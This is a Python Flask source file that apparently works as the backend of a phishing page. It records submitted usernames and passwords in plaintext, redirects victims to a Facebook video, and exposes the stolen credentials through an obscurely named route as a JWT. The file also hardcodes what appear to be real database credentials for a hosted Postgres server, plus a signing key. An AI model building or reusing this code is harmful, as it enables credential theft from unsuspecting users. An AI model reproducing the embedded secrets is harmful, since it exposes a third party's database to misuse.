from flask import Flask,render_template,jsonify,request,json,redirect
import psycopg2
from urllib.parse import urlparse
import jwt

app = Flask(__name__)

#conn=psycopg2.connect( "postgresql+psycopg2://db58945632168545_user:U3KgzbEQgnTervqB2YVIlcn1BBMGhf64@dpg-cibfeqh5rnuk9q8k3s50-a.oregon-postgres.render.com/db58945632168545")

result = urlparse("postgresql+psycopg2://db58945632168545_user:U3KgzbEQgnTervqB2YVIlcn1BBMGhf64@dpg-cibfeqh5rnuk9q8k3s50-a.oregon-postgres.render.com/db58945632168545")
username = result.username
password = result.password
database = result.path[1:]
hostname = result.hostname
port = result.port
conn = psycopg2.connect(
    database = database,
    user = username,
    password = password,
    host = hostname,
    port = port
)
if not conn:
    conn.close()
else:
    cur=conn.cursor()



@app.route("/")
def index():
    return render_template("index.html")

@app.route("/WA3Xz9nNAjQxuxaz5dnKmR5JjsxisndHWXCf", methods=['GET'])
def get():
    key='5tsZE7p1Z6TyIIXgnFoaqQSZ1erbw8Se0uOQyh4ssxDQJbadRb'
    if not cur and not conn:
        cur.close()
        conn.close()
    else:
        cur.execute('''SELECT * FROM registro''')
        users=cur.fetchall()
        name=['correo','contraseña']
        a=dict(zip(users,name))
        encoded = jwt.encode(a, key, algorithm="HS256")#tocken
    return jsonify(encoded)

@app.route("/api", methods=['POST'])
def post():
    cur=conn.cursor()
    email = request.form['username']#en la llave va el nombre name del index
    psw = request.form['password']#en la llave va el nombre name del index
    sql='''INSERT INTO registro (email_user, psw_user) VALUES (%s, %s)'''
    cur.execute(sql,(email, psw))
    conn.commit()
    cur.close()
    conn.close()
    return redirect("https://es-la.facebook.com/enespanol/videos/verano-amistoso/884965241517852/", code=302)
    

def validateUser(email_user, psw_user):
    return True

@app.errorhandler(404)
def not_found(error):
    return jsonify({'error':'not found'}), 404

if __name__ == "__main__":
    app.run(debug=True,port=5001)
